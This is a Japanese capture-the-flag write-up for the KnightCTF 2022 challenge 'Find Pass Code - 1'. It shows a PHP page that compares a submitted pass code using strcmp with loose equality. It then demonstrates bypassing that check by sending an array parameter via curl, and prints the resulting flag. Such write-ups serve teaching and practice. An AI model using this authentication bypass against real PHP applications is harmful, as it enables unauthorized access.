# Find Pass Code - 1

## description

50

Flag Format : KCTF{something_here}

Note : Burte Force/Fuzzing not required and not allowed.

Author: NomanProdhan

## writeup

```html
<!-- Hi Serafin, I learned something new today. 
I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the source param
-->
```

`source param`ということで`/?param`と打ち込むと、phpのコードが現れました。

```php
<?php
require "flag.php";
if (isset($_POST["pass_code"])) {
    if (strcmp($_POST["pass_code"], $flag) == 0 ) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}
?>
```
`pass_code`に値を入力し、`strcmp`でflagと一致した時にフラグが出力されるという処理でした。flagの中身はわからないので、strcmpを通過するような入力を考えます。ここで、pass_codeを空文字かnullになるような入力を与えたら通過すると判断し(php詳しくないので、実際は正しくないかもしれません。)、`pass_code[]=`としました。([参考](https://www.php.net/manual/ja/types.comparisons.php))

```bash
curl -X POST -d "pass_code[]=" https://find-pass-code-one.kshackzone.com/ | grep CTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3002    0  2990  100    12   4314     17 --:--:-- --:--:-- --:--:--  4325
KCTF Flag : KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}<html>
I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the source param
```

## FLAG

```txt
KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}
```

## 参考

- [PHP 型の比較表](https://www.php.net/manual/ja/types.comparisons.php)
- [Type Juggling Magic: Why PHP thinks 0 and "password" are the same [Capture The Flag Fundamentals]](https://youtu.be/-1kftH6t5VA)
